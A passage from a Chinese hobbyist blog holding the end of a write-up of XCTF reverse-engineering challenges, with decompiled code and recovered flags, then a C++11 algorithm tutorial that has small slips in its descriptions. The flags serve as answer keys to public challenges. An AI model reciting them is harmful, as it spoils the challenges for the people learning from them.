class="number">23</span>], <span class="number">10</span>);</span><br><span class="line">var92 = sub_ab(var91, <span class="number">5</span>);</span><br><span class="line">var93 = mul_ab(var92, <span class="number">8</span>);</span><br><span class="line">var94 = add_ab(var93, <span class="number">9</span>);</span><br><span class="line">add_ab(var94, <span class="number">48</span>);</span><br><span class="line"><span class="comment">// 97 = a</span></span><br><span class="line"></span><br><span class="line">var95 = add_ab(&amp;flag_chars[<span class="number">24</span>], <span class="number">1</span>);</span><br><span class="line">var96 = add_ab(var95, <span class="number">3</span>);</span><br><span class="line">var97 = add_ab(var96, <span class="number">3</span>);</span><br><span class="line">var98 = add_ab(var97, <span class="number">3</span>);</span><br><span class="line">var99 = add_ab(var98, <span class="number">6</span>);</span><br><span class="line">var100 = add_ab(var99, <span class="number">6</span>);</span><br><span class="line">var101 = add_ab(var100, <span class="number">6</span>);</span><br><span class="line">add_ab(var101, <span class="number">20</span>);</span><br><span class="line"><span class="comment">// 49 = 1</span></span><br><span class="line"></span><br><span class="line">var102 = add_ab(&amp;flag_chars[<span class="number">25</span>], <span class="number">55</span>);</span><br><span class="line">var103 = sub_ab(var102, <span class="number">33</span>);</span><br><span class="line">var104 = add_ab(var103, <span class="number">44</span>);</span><br><span class="line">var105 = sub_ab(var104, <span class="number">11</span>);</span><br><span class="line">add_ab(var105, <span class="number">42</span>);</span><br><span class="line"><span class="comment">// 98 = b</span></span><br><span class="line"></span><br><span class="line">add_ab(&amp;flag_chars[<span class="number">26</span>], flag_chars[<span class="number">25</span>]); <span class="comment">// flag_chars[25] = 98</span></span><br><span class="line"><span class="comment">// 99 = c</span></span><br><span class="line"></span><br><span class="line">add_ab(&amp;flag_chars[<span class="number">27</span>], flag_chars[<span class="number">12</span>]); <span class="comment">// flag_chars[12] = 49</span></span><br><span class="line"><span class="comment">// 50 = 2</span></span><br><span class="line"></span><br><span class="line">var106 = flag_chars[<span class="number">27</span>]; <span class="comment">// 50</span></span><br><span class="line">var107 = sub_ab(&amp;flag_chars[<span class="number">28</span>], <span class="number">1</span>);</span><br><span class="line">var108 = add_ab(var107, var106);</span><br><span class="line">sub_ab(var108, <span class="number">1</span>);</span><br><span class="line"><span class="comment">// 49 = 1</span></span><br><span class="line"></span><br><span class="line">var109 = flag_chars[<span class="number">23</span>]; <span class="comment">// 97</span></span><br><span class="line">var110 = sub_ab(&amp;flag_chars[<span class="number">29</span>], <span class="number">1</span>);</span><br><span class="line">var111 = mul_ab(var110, <span class="number">1000000</span>);</span><br><span class="line">add_ab(var111, var109);</span><br><span class="line"><span class="comment">// 97 = a</span></span><br><span class="line"></span><br><span class="line">var112 = flag_chars[<span class="number">27</span>]; <span class="comment">// 50</span></span><br><span class="line">var113 = add_ab(&amp;flag_chars[<span class="number">30</span>], <span class="number">1</span>);</span><br><span class="line">mul_ab(var113, var112);</span><br><span class="line"><span class="comment">// 100 = d</span></span><br><span class="line"></span><br><span class="line">add_ab(&amp;flag_chars[<span class="number">31</span>], flag_chars[<span class="number">30</span>]); <span class="comment">// flag_chars[30] = 100</span></span><br><span class="line"><span class="comment">// 101 = e</span></span><br><span class="line"></span><br><span class="line">print_func(<span class="string">"CTF&#123;"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">32</span>; ++j )</span><br><span class="line">  print_func(<span class="string">"%c"</span>); <span class="comment">// print flag </span></span><br><span class="line"></span><br><span class="line">print_func(<span class="string">"&#125;\n"</span>);</span><br></pre></td></tr></table></figure>
<p>最后的flag <code>CTF{daf8f4d816261a41a115052a1bc21ade}</code></p>
<h2 id="actually-cpp-swf待做"><a href="#actually-cpp-swf待做" class="headerlink" title="actually_cpp.swf待做"></a>actually_cpp.swf待做</h2><p>swf文件，再说</p>
<h2 id="internet-of-what"><a href="#internet-of-what" class="headerlink" title="internet-of-what"></a>internet-of-what</h2><p>TMD也太难了吧，放弃放弃，和固件什么有关</p>
<p><a href="https://github.com/ctfs/write-ups-2016/tree/master/asis-ctf-2016/reverse/internet-of-what-163" target="_blank" rel="noopener">wp</a></p>
<h2 id="myDriver待做"><a href="#myDriver待做" class="headerlink" title="myDriver待做"></a>myDriver待做</h2><p>驱动逆向，wp上和hook无关，直接逆的算法，存了pdf</p>
<blockquote>
<p>一个简单的Inlinehook，hook NtCreateFile 函数。</p>
<p>在任意路径打开文件名为 P_giveMe_flag_233.txt 的文件超过8次，在第9次打开 P_giveMe_flag_233.txt 的时候就会在里面写入flag。 文件名进过简单的加密，加密的 key 是自己构造的一段 win64 的汇编生成</p>
</blockquote>
<p>另外的wp，等学了hook再看看</p>
<p>还是得看看《加密与解密》</p>
<h2 id="家徒四壁-void"><a href="#家徒四壁-void" class="headerlink" title="家徒四壁-void"></a>家徒四壁-void</h2><p>hitcon2017的题….elf注入</p>
<p>对不起，看不懂</p>
<p><a href="https://azure.kdays.cn/2017/11/08/HITCON2017-writeup/" target="_blank" rel="noopener">wp</a></p>
<p>攻防世界的wp比较详细，但是我看不懂</p>
<h2 id="debg-exe"><a href="#debg-exe" class="headerlink" title="debg.exe"></a>debg.exe</h2><p>没打错，题目就是叫<code>debg</code></p>
<p>又是一个.net逆向，发现做过的几题都是下断点然后就明文比较出flag了…..</p>
<p>不过这题需要用32位的dnSpy</p>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/31.png" alt="31"></p>
<blockquote>
<p>吐槽一句，这个平台上的难度评级就是闹着玩的…</p>
</blockquote>
<h2 id="HW-RE"><a href="#HW-RE" class="headerlink" title="HW-RE"></a>HW-RE</h2><p>18年国赛的一题</p>
<p>通过<code>strtok</code>切割flag，flag类似于<code>CISCN{flag1_flag2_flag3}</code></p>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/32.png" alt="32"></p>
<p>第二、三段存入变量显示是循环+数组方式，实际上是后文会直接用到的一个变量，观察栈布局偏移可以看出来</p>
<p>后面就是把这三段flag分别检查了</p>
<p><img src="/2019/01/20/XCTF攻防世界-逆向wp/33.png" alt="33"></p>
<p>第一个检查我感觉各种wp不太严谨</p>
<p>前面一大段是一个md5，不过一开始不太好猜，后面是根据加密过的hash值反推出原本的hash值再去查找</p>
<blockquote>
<p>wp说：明文hash中的A-F字符，经过运算后可以生成大于F的字符，这样就可以反推出原来hash里的字符</p>
<p>问题：比如字符K，可能是由A-F经过运算得出的，也可能本身就是K</p>
<p>（没有仔细分析，也有可能前面限制了明文hash中英文字母都是A-F）</p>
</blockquote>
<p>不管了，跳过这一步，就认为原来明文hash英文字母都是A-F</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check1</span><span class="params">(str0)</span>:</span></span><br><span class="line">    flagmd5 = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(str0)):</span><br><span class="line">        temp = ord(str0[i])-i%<span class="number">10</span></span><br><span class="line">        <span class="keyword">if</span> temp &lt;= ord(<span class="string">'A'</span>) + <span class="number">5</span> <span class="keyword">and</span> temp &gt;= ord(<span class="string">'A'</span>):</span><br><span class="line">            flagmd5 += chr(temp)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flagmd5 += str0[i]</span><br><span class="line">    <span class="keyword">return</span> flagmd5</span><br></pre></td></tr></table></figure>
<p>解密后结果：<code>yubu</code></p>
<p>第二个检查：</p>
<p>明文hash异或一组数据后，再经过前面检查的同样的运算，得到一个hash</p>
<p>解密：先同样用上面的方法，再异或，最后查询md5，得到<code>kulo</code></p>
<p>第三个检查，感觉没什么意思(不太喜欢图片那些)，贴wp了</p>
<blockquote>
<p>flag3和flag2的算法一样，只是flag3长度为16位，很难破解查询，但随后提供了一个方法可以获取到flag3。如下：</p>
<p>1)取flag2的哈希（16进制）的16字节之和（记为total），然后使用total产生两个值。 x1 = total/16 x2 = total%16</p>
<p>2)将x1和x2分别和flag3的第4、5位进行异或得到xor1和xor2，即</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xor1 = x1^flag3[<span class="number">3</span>]</span><br><span class="line">xor2 = x1^flag3[<span class="number">4</span>])</span><br></pre></td></tr></table></figure>
<blockquote>
<p>3)全局变量中预置了一段数据data，将上面的xor1和xor2分别和data的奇偶字节进行异或得到数据data1，使用fwrite写入文件</p>
<p>4)只要输入的flag3[3]、 flag3[4]合适，就会产生一张图片，里面记录了完整的flag3。</p>
<p>5)所以需要通过写文件这个操作能联想到写入的文件是图片文件，然后根据图片文件的头部固定字节就可以反推出flag3[3]、 flag3[4]</p>
<p>6)本来开始是在写文件的时候加上后缀，这样就可以降低题目难度，后面想了下还是先不加后缀，可以将这个后缀放到提示里面。</p>
</blockquote>
<p>​                                    </p>
<p>另外一个wp提到，2个char数据可以爆破，因为出题人给了一张png，所以可以查找图片头尾字段</p>
<p><a href="https://blog.csdn.net/aptx4869_li/article/details/80589250" target="_blank" rel="noopener">wp2</a></p>
<blockquote>
<p>题目做到这里，感觉md5、hash的那些还是需要一些直觉</p>
<p>看到一堆函数，一段类似(加密过的)hash，应该先解密原先的hash，而不是直接拿头逆函数</p>
<p>还有就是代码里有一段malloc没看懂，也许是混淆？感觉没什么用</p>
</blockquote>
<h2 id="uwp-454"><a href="#uwp-454" class="headerlink" title="uwp-454"></a>uwp-454</h2><p>uwp逆向，再见</p>
<h2 id="catalyst"><a href="#catalyst" class="headerlink" title="catalyst"></a>catalyst</h2><p>做过的题，主要的一点就是随机种子确定，随机序列也确定</p>
<p><a href="https://purecall.github.io/2019/01/03/CTF的一些做题记录/" target="_blank" rel="noopener">wp</a></p>
<h2 id="unvm-me-pyc待做"><a href="#unvm-me-pyc待做" class="headerlink" title="unvm_me.pyc待做"></a>unvm_me.pyc待做</h2><p><a href="https://github.com/ctfs/write-ups-2017/tree/master/alexctf-2017/reverse-engineering/re4-unvm-me-250" target="_blank" rel="noopener">wps</a></p>
<h2 id="shamecontrol-200待做"><a href="#shamecontrol-200待做" class="headerlink" title="shamecontrol-200待做"></a>shamecontrol-200待做</h2><p>SE壳脱壳，.net</p>
<p>存了wp</p>
<h2 id="TankGame"><a href="#TankGame" class="headerlink" title="TankGame"></a>TankGame</h2><p>题目给了一个rar文件，解压后发现有游戏exe，一些地图之类，通关给flag</p>
<p>看了网上的wp，有的是用IDA把敌方数量降成1，有的是改地图</p>
<p>而我就比较厉害了，我连游戏都打不开，再见</p>
<h2 id="what-does-this-button-do"><a href="#what-does-this-button-do" class="headerlink" title="what-does-this-button-do"></a>what-does-this-button-do</h2><p>jar文件，看到<code>FlagActivity()</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;)&#123;</span><br><span class="line">    <span class="keyword">if</span> (i &gt;= <span class="number">22</span>)&#123;</span><br><span class="line">        ((TextView)findViewById(<span class="number">2131230721</span>)).setText(paramBundle);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">	paramBundle = paramBundle.concat(String.valueOf((<span class="keyword">char</span>)<span class="keyword">new</span> <span class="keyword">int</span>[] &#123; <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">119</span>, <span class="number">52</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">52</span>, <span class="number">95</span>, <span class="number">106</span>, <span class="number">52</span>, <span class="number">114</span>, <span class="number">95</span>, <span class="number">109</span>, <span class="number">121</span>, <span class="number">95</span>, <span class="number">100</span>, <span class="number">51</span>, <span class="number">120</span>, <span class="number">125</span> &#125;[i]));</span><br><span class="line">	i += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接转成ASCII，<code>flag{w4nn4_j4r_my_d3x}</code></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/18/C-算法库/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="purecall">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/header.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="vct的演算纸">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/18/C-算法库/" itemprop="url">C++算法库</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-18T18:53:49+08:00">
                2019-01-18
              </time>
            

            

            
          </span>

          

          
            
          

          
          
             <span id="/2019/01/18/C-算法库/" class="leancloud_visitors" data-flag-title="C++算法库">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>目前主要介绍我所接触到的C++11中新增的算法</p>
<h1 id="判断：谓词"><a href="#判断：谓词" class="headerlink" title="判断：谓词"></a>判断：谓词</h1><p>C++11新增了三个用于判断的算法<code>all_of</code>，<code>any_of</code>，<code>none_of</code></p>
<h2 id="all-of"><a href="#all-of" class="headerlink" title="all_of"></a>all_of</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt; <span class="class"><span class="keyword">class</span> <span class="title">InputIt</span>, <span class="title">class</span> <span class="title">UnaryPredicate</span> &gt;</span></span><br><span class="line"><span class="class"><span class="title">bool</span> <span class="title">all_of</span>( <span class="title">InputIt</span> <span class="title">first</span>, <span class="title">InputIt</span> <span class="title">last</span>, <span class="title">UnaryPredicate</span> <span class="title">p</span> );</span></span><br></pre></td></tr></table></figure>
<p>检查区间[first, last)中是否所有的元素都满足一元判断式p，所有的元素都满足条件返回true，否则返回false</p>
<h2 id="any-of"><a href="#any-of" class="headerlink" title="any_of"></a>any_of</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt; <span class="class"><span class="keyword">class</span> <span class="title">InputIt</span>, <span class="title">class</span> <span class="title">UnaryPredicate</span> &gt;</span></span><br><span class="line"><span class="class"><span class="title">bool</span> <span class="title">any_of</span>( <span class="title">InputIt</span> <span class="title">first</span>, <span class="title">InputIt</span> <span class="title">last</span>, <span class="title">UnaryPredicate</span> <span class="title">p</span> );</span></span><br></pre></td></tr></table></figure>
<p>检查区间[first, last)中是否至少有一个元素都满足一元判断式p，只要有一个元素满足条件就返回true，否则返回true</p>
<h2 id="none-of"><a href="#none-of" class="headerlink" title="none_of"></a>none_of</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt; <span class="class"><span class="keyword">class</span> <span class="title">InputIt</span>, <span class="title">class</span> <span class="title">UnaryPredicate</span> &gt;</span></span><br><span class="line"><span class="class"><span class="title">bool</span> <span class="title">none_of</span>( <span class="title">InputIt</span> <span class="title">first</span>, <span class="title">InputIt</span> <span class="title">last</span>, <span class="title">UnaryPredicate</span> <span class="title">p</span> );</span></span><br></pre></td></tr></table></figure>
<p>检查区间[first, last)中是否所有的元素都不满足一元判断式p，所有的元素都不满足条件返回true，否则返回false</p>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>**argv)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v = &#123; <span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span> &#125;;</span><br><span class="line">	<span class="keyword">auto</span> isEven = [](<span class="keyword">int</span> i) &#123; <span class="keyword">return</span> i % <span class="number">2</span> != <span class="number">0</span>; &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">bool</span> isAllOdd = <span class="built_in">std</span>::all_of(v.begin(), v.end(), isEven);</span><br><span class="line">	<span class="keyword">if</span> (isAllOdd) &#123;</span><br><span class="line">		<span class="comment">// true</span></span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"all is odd"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">bool</span> isNoneEven = <span class="built_in">std</span>::none_of(v.begin(), v.end(), isEven);</span><br><span class="line">	<span class="keyword">if</span> (isNoneEven) &#123;</span><br><span class="line">		<span class="comment">// false</span></span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"none is even"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v1 = &#123; <span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span> &#125;;</span><br><span class="line">	<span class="keyword">bool</span> anyof = <span class="built_in">std</span>::any_of(v1.begin(), v1.end(), isEven);</span><br><span class="line">	<span class="keyword">if</span> (anyof) &#123;</span><br><span class="line">		<span class="comment">// true</span></span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"at least one is even"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h1><h2 id="find-if-not"><a href="#find-if-not" class="headerlink" title="find_if_not"></a>find_if_not</h2><p>含义与<code>find_if</code> 相反，查找不符合某个条件的元素</p>
<p><code>find_if</code>也可以实现相同的功能，但是借助<code>find_if_not</code>，就不必再写否定的判断式了，也提升了可读性</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>**argv)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v = &#123; <span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">4</span> &#125;;</span><br><span class="line">	<span class="keyword">auto</span> isEven = [](<span class="keyword">int</span> i) &#123; <span class="keyword">return</span> i % <span class="number">2</span> == <span class="number">0</span>; &#125;;</span><br><span class="line">	<span class="keyword">auto</span> firstEven = <span class="built_in">std</span>::find_if(v.begin(), v.end(), isEven);</span><br><span class="line">	<span class="keyword">if</span> (firstEven != v.end())</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"the first even is "</span> &lt;&lt; *firstEven &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//用find_if来查找奇数则需要重新写一个否定含义的判断式</span></span><br><span class="line">	<span class="keyword">auto</span> isNotEven = [](<span class="keyword">int</span> i) &#123;<span class="keyword">return</span> i % <span class="number">2</span> != <span class="number">0</span>; &#125;;</span><br><span class="line">	<span class="keyword">auto</span> firstOdd = <span class="built_in">std</span>::find_if(v.begin(), v.end(), isNotEven);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (firstOdd != v.end()) &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"the first odd is "</span> &lt;&lt; *firstOdd &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//用find_if_not来查找奇数则无需新定义判断式</span></span><br><span class="line">	<span class="keyword">auto</span> odd = <span class="built_in">std</span>::find_if_not(v.begin(), v.end(), isEven);</span><br><span class="line">	<span class="keyword">if</span> (odd != v.end()) &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"the first odd is "</span> &lt;&lt; *odd &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">the first even is <span class="number">4</span></span><br><span class="line">the first odd is <span class="number">1</span></span><br><span class="line">the first odd is <span class="number">1</span></span><br></pre></td></tr></table></figure>
<h2 id="copy-if"><a href="#copy-if" class="headerlink" title="copy_if"></a>copy_if</h2><p>代码中缩减vector值得学习一下</p>
<p>实际上是对每一个元素应用一个<strong>谓词</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>**argv)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v = &#123; <span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">4</span> &#125;;</span><br><span class="line">	<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v1(v.size());</span><br><span class="line">	<span class="comment">//根据条件拷贝</span></span><br><span class="line">	<span class="keyword">auto</span> it = <span class="built_in">std</span>::copy_if(v.begin(), v.end(), v1.begin(), [](<span class="keyword">int</span> i) &#123;<span class="keyword">return</span> i % <span class="number">2</span> != <span class="number">0</span>; &#125;);</span><br><span class="line">	<span class="comment">//缩减vector到合适大小</span></span><br><span class="line">	v1.resize(<span class="built_in">std</span>::distance(v1.begin(), it));</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i : v1)&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; i &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="有序序列：iota"><a href="#有序序列：iota" class="headerlink" title="有序序列：iota"></a>有序序列：iota</h1><p>用于生成有序序列，比如我们需要一个定长数组，数组中的元素都是在某一个数值的基础之上递增的</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;numeric&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;array&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>**argv)</span></span>&#123;</span><br><span class="line">	<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v(<span class="number">4</span>);</span><br><span class="line">	<span class="comment">//循环遍历赋值来初始化数组</span></span><br><span class="line">	<span class="comment">//for(int i=1; i&lt;=4; i++)&#123;</span></span><br><span class="line">	<span class="comment">//    v.push_back(i);</span></span><br><span class="line">	<span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//直接通过iota初始化数组，更简洁</span></span><br><span class="line">	<span class="built_in">std</span>::iota(v.begin(), v.end(), <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">auto</span> n : v) &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; n &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">int</span>, 4&gt; <span class="built_in">array</span>;</span><br><span class="line">	<span class="built_in">std</span>::iota(<span class="built_in">array</span>.begin(), <span class="built_in">array</span>.end(), <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">auto</span> n : <span class="built_in">array</span>) &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; n &lt;&lt; <span class="string">" 